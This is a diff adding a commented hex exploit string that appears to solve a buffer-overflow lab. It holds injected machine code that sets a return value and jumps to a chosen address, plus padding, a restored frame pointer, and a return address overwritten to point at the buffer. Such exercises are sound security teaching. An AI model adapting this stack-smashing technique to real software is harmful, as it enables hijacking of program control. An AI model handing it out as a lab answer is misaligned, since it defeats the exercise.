@@ -1,0 +1,9 @@
+b8 bc 0f a6 76       	/* mov    $0x76a60fbc,%eax (0x76a60fbc is my cookie, as a return value.) */
+68 47 8c 04 08       	/* push   $0x8048c47 (0x8048c47 is the return address.) */
+c3                   	/* ret    */
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35
+b0 36 68 55				/* the right old %ebp */
+68 36 68 55				/* 0x55683668 is address of buf. */
